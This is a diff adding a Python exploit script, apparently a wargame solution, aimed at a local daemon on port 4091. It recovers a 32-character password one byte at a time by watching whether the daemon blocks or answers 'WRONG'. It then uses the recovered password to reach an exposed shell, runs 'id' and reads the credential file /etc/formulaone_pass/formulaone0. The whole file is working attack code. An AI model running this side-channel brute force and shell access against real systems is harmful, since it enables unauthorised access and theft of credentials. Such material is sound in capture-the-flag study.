@@ -1,0 +1,48 @@
+import socket, string, time
+
+HOST, PORT = "127.0.0.1", 4091
+
+def probe(prefix):
+    s = socket.create_connection((HOST, PORT), timeout=5)
+    s.recv(20)
+    s.sendall(prefix)
+    s.settimeout(1.5)
+    try:
+        r = s.recv(50)
+        return "WRONG" if b"WRONG" in r else "DATA"
+    except socket.timeout:
+        return "BLOCKED"   # correct byte: the daemon blocks in recv for the next one
+    finally:
+        s.close()
+
+chars = [c.encode() for c in string.ascii_letters + string.digits + "_-{}!@#$%^&*()"]
+pw = b""
+for pos in range(32):
+    for c in chars:
+        if probe(pw + c) == "BLOCKED":
+            pw += c
+            print("pos", pos, "->", pw.decode(), flush=True)
+            break
+    else:
+        break
+print("PASSWORD:", pw.decode(), flush=True)
+
+# use it: dup2'ed shell
+s = socket.create_connection((HOST, PORT), timeout=5)
+s.recv(20)
+s.sendall(pw)
+time.sleep(0.5)
+s.sendall(b"id\n")
+time.sleep(0.5)
+s.sendall(b"cat /etc/formulaone_pass/formulaone0\n")
+time.sleep(1)
+s.settimeout(4)
+data = b""
+try:
+    while True:
+        c = s.recv(4096)
+        if not c: break
+        data += c
+except socket.timeout:
+    pass
+print("SHELL OUTPUT:\n" + data.decode("latin-1"))
